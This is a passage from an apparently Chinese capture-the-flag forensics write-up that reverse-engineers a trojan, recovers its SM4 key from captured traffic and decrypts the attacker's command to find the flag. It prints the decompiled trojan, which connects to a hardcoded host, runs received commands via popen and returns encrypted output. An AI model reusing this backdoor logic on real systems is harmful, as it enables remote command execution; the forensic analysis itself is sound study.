class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-115Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-1158h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-1154h] BYREF</span></span><br><span class="line">  _DWORD v8[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-1150h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">128</span>]; <span class="comment">// [rsp+20h] [rbp-1140h] BYREF</span></span><br><span class="line">  _BYTE v10[<span class="number">128</span>]; <span class="comment">// [rsp+A0h] [rbp-10C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> command[<span class="number">4096</span>]; <span class="comment">// [rsp+120h] [rbp-1040h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">s</span>;</span> <span class="comment">// [rsp+1120h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+1134h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+1138h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+113Ch] [rbp-24h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+1140h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+1148h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+114Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1150h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1154h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+1158h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+115Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  fd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">48</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  s.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = inet_addr(<span class="string">&quot;192.168.1.201&quot;</span>);</span><br><span class="line">  *(_WORD *)s.sa_data = htons(<span class="number">0xE59Eu</span>);</span><br><span class="line">  <span class="keyword">if</span> ( connect(fd, &amp;s, <span class="number">0x10u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_18ED((<span class="type">unsigned</span> <span class="type">int</span>)fd, &amp;v7, <span class="number">4LL</span>, <span class="number">0LL</span>) != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  seed = (v7 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span> | (v7 &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span> | (v7 &lt;&lt; <span class="number">24</span>) | HIBYTE(v7);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    v8[i] = rand();</span><br><span class="line">  sub_13B4(v10, v8, <span class="number">0LL</span>);</span><br><span class="line">  sub_13B4(v9, v8, <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_18ED((<span class="type">unsigned</span> <span class="type">int</span>)fd, &amp;v6, <span class="number">4LL</span>, <span class="number">0LL</span>) == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (v6 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span> | (v6 &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span> | (v6 &lt;&lt; <span class="number">24</span>) | HIBYTE(v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">0x1000</span> &amp;&amp; v6 &amp;&amp; (v6 &amp; <span class="number">0xF</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = sub_18ED((<span class="type">unsigned</span> <span class="type">int</span>)fd, command, v6, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v21 != v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_1860(v10, <span class="number">0LL</span>, command, command, v21);</span><br><span class="line">      v17 = (<span class="type">unsigned</span> __int8)command[v21 - <span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v17 &amp;&amp; v17 &lt;= <span class="number">16</span> )</span><br><span class="line">        command[v21 - v17] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        command[v21] = <span class="number">0</span>;</span><br><span class="line">      stream = popen(command, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( stream )</span><br><span class="line">      &#123;</span><br><span class="line">        v21 = fread(command, <span class="number">1uLL</span>, <span class="number">0xFFFu</span>LL, stream);</span><br><span class="line">        pclose(stream);</span><br><span class="line">        command[v21] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(command, <span class="string">&quot;popen failed\n&quot;</span>);</span><br><span class="line">        v21 = <span class="built_in">strlen</span>(command);</span><br><span class="line">      &#125;</span><br><span class="line">      v15 = v21;</span><br><span class="line">      v14 = <span class="number">16</span> * (v21 / <span class="number">16</span> + <span class="number">1</span>);</span><br><span class="line">      v13 = v14 - v21;</span><br><span class="line">      <span class="keyword">for</span> ( j = v21; j &lt; v14; command[j++] = v13 )</span><br><span class="line">        ;</span><br><span class="line">      sub_1860(v9, <span class="number">1LL</span>, command, command, v14);</span><br><span class="line">      v5 = (v14 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span> | (v14 &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span> | (v14 &lt;&lt; <span class="number">24</span>) | (v14 &gt;&gt; <span class="number">24</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_197F((<span class="type">unsigned</span> <span class="type">int</span>)fd, &amp;v5, <span class="number">4LL</span>, <span class="number">0LL</span>) != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = sub_197F((<span class="type">unsigned</span> <span class="type">int</span>)fd, command, v14, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v14 != v3 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显是一个开启socket用于执行命令的木马<br>注意此处：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_18ED((<span class="type">unsigned</span> <span class="type">int</span>)fd, &amp;v7, <span class="number">4LL</span>, <span class="number">0LL</span>) != <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">seed = (v7 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span> | (v7 &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span> | (v7 &lt;&lt; <span class="number">24</span>) | HIBYTE(v7);<span class="comment">//这个地方实际上就是在转小端序</span></span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  v8[i] = rand();</span><br></pre></td></tr></table></figure>
<p>这里接收了一个unsigned int v7，且为4字节；将其进行移位并赋值给seed作为种子生成v8[4]<br>因为代码里硬编码了ip 192.168.1.201，因此后面直接来看与192.168.1.201进行通信的TCP包<br>Data (4 bytes)<br>    Data: 34952046<br>    [Length: 4]<br>可知这就是传给木马的v7了。<br>继续分析代码，接下来是<br>  sub_13B4(v10, v8, 0LL);<br>  sub_13B4(v9, v8, 1LL);<br>这里的一个0一个1，很可能是一个用于加密一个用于解密的。<br>继续分析代码发现了<br>.rodata:0000000000002020 ; unsigned __int8 byte_2020[256]<br>.rodata:0000000000002020 byte_2020       db 0D6h, 90h, 0E9h, 0FEh, 0CCh, 0E1h, 3Dh, 0B7h, 16h, 0B6h<br>.rodata:0000000000002020                                         ; DATA XREF: sub_1229+26↑o<br>.rodata:000000000000202A                 db 14h, 0C2h, 28h, 0FBh, 2Ch, 5, 2Bh, 67h, 9Ah, 76h, 2Ah<br>.rodata:0000000000002035                 db 0BEh, 4, 0C3h, 0AAh, 44h, 13h, 26h, 49h, 86h, 6, 99h<br>.rodata:0000000000002040                 db 9Ch, 42h, 50h, 0F4h, 91h, 0EFh, 98h, 7Ah, 33h, 54h<br>.rodata:000000000000204A                 db 0Bh, 43h, 0EDh, 0CFh, 0ACh, 62h, 0E4h, 0B3h, 1Ch, 0A9h<br>.rodata:0000000000002054                 db 0C9h, 8, 0E8h, 95h, 80h, 0DFh, 94h, 0FAh, 75h, 8Fh<br>.rodata:000000000000205E                 db 3Fh, 0A6h, 47h, 7, 0A7h, 0FCh, 0F3h, 73h, 17h, 0BAh<br>.rodata:0000000000002068                 db 83h, 59h, 3Ch, 19h, 0E6h, 85h, 4Fh, 0A8h, 68h, 6Bh<br>.rodata:0000000000002072                 db 81h, 0B2h, 71h, 64h, 0DAh, 8Bh, 0F8h, 0EBh, 0Fh, 4Bh<br>.rodata:000000000000207C                 db 70h, 56h, 9Dh, 35h, 1Eh, 24h, 0Eh, 5Eh, 63h, 58h, 0D1h<br>.rodata:0000000000002087                 db 0A2h, 25h, 22h, 7Ch, 3Bh, 1, 21h, 78h, 87h, 0D4h, 0<br>.rodata:0000000000002092                 db 46h, 57h, 9Fh, 0D3h, 27h, 52h, 4Ch, 36h, 2, 0E7h, 0A0h<br>.rodata:000000000000209D                 db 0C4h, 0C8h, 9Eh, 0EAh, 0BFh, 8Ah, 0D2h, 40h, 0C7h, 38h<br>.rodata:00000000000020A7                 db 0B5h, 0A3h, 0F7h, 0F2h, 0CEh, 0F9h, 61h, 15h, 0A1h<br>.rodata:00000000000020B0                 db 0E0h, 0AEh, 5Dh, 0A4h, 9Bh, 34h, 1Ah, 55h, 0ADh, 93h<br>.rodata:00000000000020BA                 db 32h, 30h, 0F5h, 8Ch, 0B1h, 0E3h, 1Dh, 0F6h, 0E2h, 2Eh<br>.rodata:00000000000020C4                 db 82h, 66h, 0CAh, 60h, 0C0h, 29h, 23h, 0ABh, 0Dh, 53h<br>.rodata:00000000000020CE                 db 4Eh, 6Fh, 0D5h, 0DBh, 39h, 0B8h, 31h, 11h, 0Ch, 5Ah<br>.rodata:00000000000020D8                 db 0CBh, 3Eh, 0Ah, 45h, 0E5h, 94h, 77h, 5Bh, 8Dh, 6Dh<br>.rodata:00000000000020E2                 db 48h, 41h, 10h, 0BDh, 9, 0C1h, 4Ah, 89h, 0Dh, 6Eh, 97h<br>.rodata:00000000000020ED                 db 0A1h, 1Dh, 16h, 0Ah, 0D9h, 88h, 6Ah, 96h, 0D1h, 6Bh<br>.rodata:00000000000020F7                 db 32h, 2, 35h, 46h, 6, 7Dh, 65h, 49h, 8Ch, 0F0h, 3Eh<br>.rodata:0000000000002102                 db 2Dh, 7Ah, 15h, 0FFh, 5, 8Eh, 1, 84h, 3Ch, 3Ah, 38h<br>.rodata:000000000000210D                 db 53h, 87h, 7Bh, 0Bh, 2Bh, 7Eh, 0Fh, 0F6h, 69h, 0A8h<br>.rodata:0000000000002117                 db 5Ah, 0B5h, 4Ch, 1Bh, 39h, 7Fh, 8, 8Dh, 1Ch<br>这个很明显是 SM4 的标准 S 盒。之前那个v8是128位的，那基本可以确实就是SM4密钥了。<br>写一个c程序获取密钥即可。注意要在linux上使用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> seed = <span class="number">0x34952046</span>; </span><br><span class="line">    srand(seed);</span><br><span class="line">    <span class="type">uint32_t</span> v8[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        v8[i] = rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *key_byte_ptr = (<span class="type">unsigned</span> <span class="type">char</span> *)v8;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, key_byte_ptr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里需要注意大端序小端序问题。<br>必须转为char形式，因为：<br>算法需求：SM4操作的是字节流，不是整数数组<br>字节序问题：直接打印整数会得到错误的字节顺序<br>内存表示：需要按内存中的实际布局获取数据<br>通用性：字节表示在所有平台上都是一致的<br>密钥：<br>ac46fb610b313b4f32fc642d8834b456</p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>要求找到黑客获取的服务器中的flag值。</p>
<p>分析代码可知，是一个标准SM4+替换过的S盒<br>这部分参考了<a target="_blank" rel="noopener" href="https://www.dr0n.top/posts/22eff239/#SnakeBackdoor-6%EF%BC%8C%E6%84%9F%E8%B0%A2%E5%B8%88%E5%82%85%E7%9A%84wp%E3%80%82">https://www.dr0n.top/posts/22eff239/#SnakeBackdoor-6，感谢师傅的wp。</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RAW_HEX = <span class="string">&quot;&quot;&quot;00000030</span></span><br><span class="line"><span class="string">7f4b0ef4806983f164af6f46b71d3fce1e3c0bd00c4dd162b72c156f0f3aecd2afcabf551e08380db6fd20316f8a2729&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">KEY_HEX = <span class="string">&quot;ac46fb610b313b4f32fc642d8834b456&quot;</span></span><br><span class="line">SBOX_HEX = (</span><br><span class="line">    <span class="string">&quot;d690e9fecce13db716b614c228fb2c05&quot;</span></span><br><span class="line">    <span class="string">&quot;2b679a762abe04c3aa44132649860699&quot;</span></span><br><span class="line">    <span class="string">&quot;9c4250f491ef987a33540b43edcfac62&quot;</span></span><br><span class="line">    <span class="string">&quot;e4b31ca9c908e89580df94fa758f3fa6&quot;</span></span><br><span class="line">    <span class="string">&quot;4707a7fcf37317ba83593c19e6854fa8&quot;</span></span><br><span class="line">    <span class="string">&quot;686b81b27164da8bf8eb0f4b70569d35&quot;</span></span><br><span class="line">    <span class="string">&quot;1e240e5e6358d1a225227c3b01217887&quot;</span></span><br><span class="line">    <span class="string">&quot;d40046579fd327524c3602e7a0c4c89e&quot;</span></span><br><span class="line">    <span class="string">&quot;eabf8ad240c738b5a3f7f2cef96115a1&quot;</span></span><br><span class="line">    <span class="string">&quot;e0ae5da49b341a55ad933230f58cb1e3&quot;</span></span><br><span class="line">    <span class="string">&quot;1df6e22e8266ca60c02923ab0d534e6f&quot;</span></span><br><span class="line">    <span class="string">&quot;d5db39b831110c5acb3e0a45e594775b&quot;</span></span><br><span class="line">    <span class="string">&quot;8d6d484110bd09c14a890d6e97a11d16&quot;</span></span><br><span class="line">    <span class="string">&quot;0ad9886a96d16b32023546067d65498c&quot;</span></span><br><span class="line">    <span class="string">&quot;f03e2d7a15ff058e01843c3a3853877b&quot;</span></span><br><span class="line">    <span class="string">&quot;0b2b7e0ff669a85ab54c1b397f088d1c&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">FK = [<span class="number">0xA3B1BAC6</span>, <span class="number">0x56AA3350</span>, <span class="number">0x677D9197</span>, <span class="number">0xB27022DC</span>]</span><br><span class="line">CK = [</span><br><span class="line">    <span class="number">0x00070E15</span>, <span class="number">0x1C232A31</span>, <span class="number">0x383F464D</span>, <span class="number">0x545B6269</span>,</span><br><span class="line">    <span class="number">0x70777E85</span>, <span class="number">0x8C939AA1</span>, <span class="number">0xA8AFB6BD</span>, <span class="number">0xC4CBD2D9</span>,</span><br><span class="line">    <span class="number">0xE0E7EEF5</span>, <span class="number">0xFC030A11</span>, <span class="number">0x181F262D</span>, <span class="number">0x343B4249</span>,</span><br><span class="line">    <span class="number">0x50575E65</span>, <span class="number">0x6C737A81</span>, <span class="number">0x888F969D</span>, <span class="number">0xA4ABB2B9</span>,</span><br><span class="line">    <span class="number">0xC0C7CED5</span>, <span class="number">0xDCE3EAF1</span>, <span class="number">0xF8FF060D</span>, <span class="number">0x141B2229</span>,</span><br><span class="line">    <span class="number">0x30373E45</span>, <span class="number">0x4C535A61</span>, <span class="number">0x686F767D</span>, <span class="number">0x848B9299</span>,</span><br><span class="line">    <span class="number">0xA0A7AEB5</span>, <span class="number">0xBCC3CAD1</span>, <span class="number">0xD8DFE6ED</span>, <span class="number">0xF4FB0209</span>,</span><br><span class="line">    <span class="number">0x10171E25</span>, <span class="number">0x2C333A41</span>, <span class="number">0x484F565D</span>, <span class="number">0x646B7279</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">SBOX = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(SBOX_HEX))</span><br><span class="line">KEY = <span class="built_in">bytes</span>.fromhex(KEY_HEX)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol32</span>(<span class="params">x, n</span>):</span><br><span class="line">    x &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) &amp; <span class="number">0xFFFFFFFF</span>) | (x &gt;&gt; (<span class="number">32</span> - n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tau_le</span>(<span class="params">x</span>):</span><br><span class="line">    b0 = (x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    b1 = (x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    b2 = (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    b3 = x &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> (SBOX[b0]</span><br><span class="line">            | (SBOX[b1] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">            | (SBOX[b2] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">            | (SBOX[b3] &lt;&lt; <span class="number">24</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">x</span>):</span><br><span class="line">    b = tau_le(x)</span><br><span class="line">    <span class="keyword">return</span> b ^ rol32(b, <span class="number">2</span>) ^ rol32(b, <span class="number">10</span>) ^ rol32(b, <span class="number">18</span>) ^ rol32(b, <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Tp</span>(<span class="params">x</span>):</span><br><span class="line">    b = tau_le(x)</span><br><span class="line">    <span class="keyword">return</span> b ^ rol32(b, <span class="number">13</span>) ^ rol32(b, <span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_schedule</span>(<span class="params">mk_bytes</span>):</span><br><span class="line">    MK = <span class="built_in">list</span>(struct.unpack(<span class="string">&quot;&gt;4I&quot;</span>, mk_bytes))</span><br><span class="line">    K = [MK[i] ^ FK[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    rk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        t = (K[i] ^ Tp(K[i+<span class="number">1</span>] ^ K[i+<span class="number">2</span>] ^ K[i+<span class="number">3</span>] ^ CK[i])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        K.append(t)</span><br><span class="line">        rk.append(t)</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crypt_block</span>(<span class="params">block16, rk32</span>):</span><br><span class="line">    X = <span class="built_in">list</span>(struct.unpack(<span class="string">&quot;&gt;4I&quot;</span>, block16))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        X.append((X[i] ^ T(X[i+<span class="number">1</span>] ^ X[i+<span class="number">2</span>] ^ X[i+<span class="number">3</span>] ^ rk32[i])) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;4I&quot;</span>, X[<span class="number">35</span>], X[<span class="number">34</span>], X[<span class="number">33</span>], X[<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_ecb</span>(<span class="params">data, rk32</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(crypt_block(data[i:i+<span class="number">16</span>], rk32) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pkcs7_unpad_loose</span>(<span class="params">b</span>):</span><br><span class="line">    pad = b[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> b[:-pad] <span class="keyword">if</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">16</span> <span class="keyword">else</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    raw = <span class="built_in">bytes</span>.fromhex(RAW_HEX)</span><br><span class="line">    ln = <span class="built_in">int</span>.from_bytes(raw[:<span class="number">4</span>], <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    ct = raw[<span class="number">4</span>:<span class="number">4</span>+ln]</span><br><span class="line"></span><br><span class="line">    rk_dec = key_schedule(KEY)[::-<span class="number">1</span>]</span><br><span class="line">    pt = pkcs7_unpad_loose(sm4_ecb(ct, rk_dec))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(pt.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>元旦花了一下午时间复现，虽然感觉后面半决就没有流量取证，更多是内存取证和上机，感觉也收获不少。后面就是速成web，然后把自己内存取证的功底捡一捡，道阻且长。</p>
<p>2026.1.1 19:52</p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/12/30/day2/" rel="prev" title="ctfshow web day2">
                  <i class="fa fa-angle-left"></i> ctfshow web day2
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Kwan1</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
